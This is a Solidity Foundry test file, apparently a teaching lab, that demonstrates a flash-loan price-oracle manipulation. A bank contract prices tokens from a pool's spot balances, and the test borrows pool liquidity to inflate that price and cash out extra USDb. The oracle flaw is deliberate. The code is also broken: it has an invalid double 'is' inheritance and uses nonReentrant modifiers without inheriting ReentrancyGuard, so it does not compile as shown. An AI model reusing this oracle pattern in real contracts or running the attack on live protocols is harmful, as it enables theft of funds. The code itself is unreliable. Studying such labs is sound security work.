pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";


contract ContractTest is Test  is ReentrancyGuard {
    USDa USDaContract;
    USDb USDbContract;
    SimplePool SimplePoolContract;
    SimpleBank SimpleBankContract;

    function setUp() public {
        USDaContract = new USDa();
        USDbContract = new USDb();
        SimplePoolContract = new SimplePool(
            address(USDaContract),
            address(USDbContract)
        );
        SimpleBankContract = new SimpleBank(
            address(USDaContract),
            address(SimplePoolContract),
            address(USDbContract)
        );
    }

    function testPrice_Manipulation() public nonReentrant {
        USDbContract.transfer(address(SimpleBankContract), 9000 ether);
        USDaContract.transfer(address(SimplePoolContract), 1000 ether);
        USDbContract.transfer(address(SimplePoolContract), 1000 ether);

        SimplePoolContract.getPrice();

        console.log(
            "There are 1000 USDa and USDb in the pool, so the price of USDa is 1 to 1 USDb."
        );
        emit log_named_decimal_uint(
            "Current USDa convert rate",
            SimplePoolContract.getPrice(),
            18
        );
        console.log("Start price manipulation");
        console.log("Borrow 500 USBa over floashloan");


        SimplePoolContract.flashLoan(500 ether, address(this), "0x0");
    }

    fallback() external {


        emit log_named_decimal_uint(
            "Price manupulated, USDa convert rate",
            SimplePoolContract.getPrice(),
            18
        );

        USDaContract.approve(address(SimpleBankContract), 100 ether);
        SimpleBankContract.exchange(100 ether);

        USDaContract.transfer(address(SimplePoolContract), 500 ether);


        emit log_named_decimal_uint(
            "Use 100 USDa to convert, My USDb balance",
            USDbContract.balanceOf(address(this)),
            18
        );
    }

    receive() external payable {}
}

contract USDa is ERC20, Ownable {
    constructor() ERC20("USDA", "USDA") {
        _mint(msg.sender, 10000 * 10 ** decimals());
    }

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }
}

contract USDb is ERC20, Ownable {
    constructor() ERC20("USDB", "USDB") {
        _mint(msg.sender, 10000 * 10 ** decimals());
    }

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }
}

contract SimplePool {
    IERC20 public USDaToken;
    IERC20 public USDbToken;

    constructor(address _USDa, address _USDb) {
        USDaToken = IERC20(_USDa);
        USDbToken = IERC20(_USDb);
    }

    function getPrice() public view returns (uint256) {

        uint256 USDaAmount = USDaToken.balanceOf(address(this));
        uint256 USDbAmount = USDbToken.balanceOf(address(this));


        if (USDaAmount == 0) {
            return 0;
        }


        uint256 USDaPrice = (USDbAmount * (10 ** 18)) / USDaAmount;
        return USDaPrice;
    }

    function flashLoan(
        uint256 amount,
        address borrower,
        bytes calldata data
    ) public nonReentrant {
        uint256 balanceBefore = USDaToken.balanceOf(address(this));
        require(balanceBefore >= amount, "Not enough liquidity");
        require(
            USDaToken.transfer(borrower, amount),
            "Flashloan transfer failed"
        );
        (bool success, ) = borrower.call(data);
        require(success, "Flashloan callback failed");
        uint256 balanceAfter = USDaToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flashloan not repaid");
    }
}

contract SimpleBank {
    IERC20 public token;
    SimplePool public pool;
    IERC20 public payoutToken;

    constructor(address _token, address _pool, address _payoutToken) {
        token = IERC20(_token);
        pool = SimplePool(_pool);
        payoutToken = IERC20(_payoutToken);
    }

    function exchange(uint256 amount) public nonReentrant {
        require(
            token.transferFrom(msg.sender, address(this), amount),
            "Transfer failed"
        );
        uint256 price = pool.getPrice();
        require(price > 0, "Price cannot be zero");
        uint256 tokensToReceive = (amount * price) / (10 ** 18);
        require(
            payoutToken.transfer(msg.sender, tokensToReceive),
            "Payout transfer failed"
        );
    }
}